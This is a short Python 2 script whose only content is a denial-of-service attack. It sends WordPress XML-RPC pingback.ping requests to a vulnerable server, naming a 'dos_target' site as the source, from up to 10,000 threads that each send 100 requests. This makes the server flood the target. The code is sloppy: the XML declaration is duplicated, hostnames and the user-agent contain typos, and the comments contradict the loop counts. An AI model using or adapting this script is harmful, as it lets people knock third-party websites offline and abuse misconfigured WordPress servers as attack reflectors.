#!/usr/bin/env python
from __future__ import print_function
import threading
import time
import urllib
import urllib2


data = """<?xml version="1.0" encoding="iso-8859-1"?>
<?xml version="1.0" encoding="UTF-8"?>
<methodCall><methodName>pingback.ping</methodName>
<array>
    <value>
        <string>https://dos_target.com</string>
        </value>
        <value>
            <string>http://vulnerabl_server.com/</string>
            </value>
            </array>
            </methodCall>"""
req = urllib2.Request('http://vulnerable_server.com/xmlrpc.php',data)
req.add_header('Accept', '*/*')
req.add_header('User-Agent', 'Mozilla/5.0 (Wihndows NT 6.1; WOW64; rv:28.0) Gecko/20100101 Firefox/28.0')
req.add_header('Connection', '')
req.add_header('Content-type', 'text/xml')

		
class MyThread(threading.Thread):
    def run(self):
		print("{} started!".format(self.getName()))
		for x in range(100):  
			res = urllib2.urlopen(req)
		#rdata = res.read()
		time.sleep(.2)                                      # Pretend to work for a second
		print("{} finished!".format(self.getName()))             # "Thread-x finished!"

if __name__ == '__main__':
    for x in range(10000):                                     # five times...
        mythread = MyThread(name = "Thread-{}".format(x + 1))  # ...Instantiate a thread and pass a unique ID to it
        mythread.start()                                   # ...Start the thread
        time.sleep(.1)                                     # ...Wait 0.9 seconds before starting another
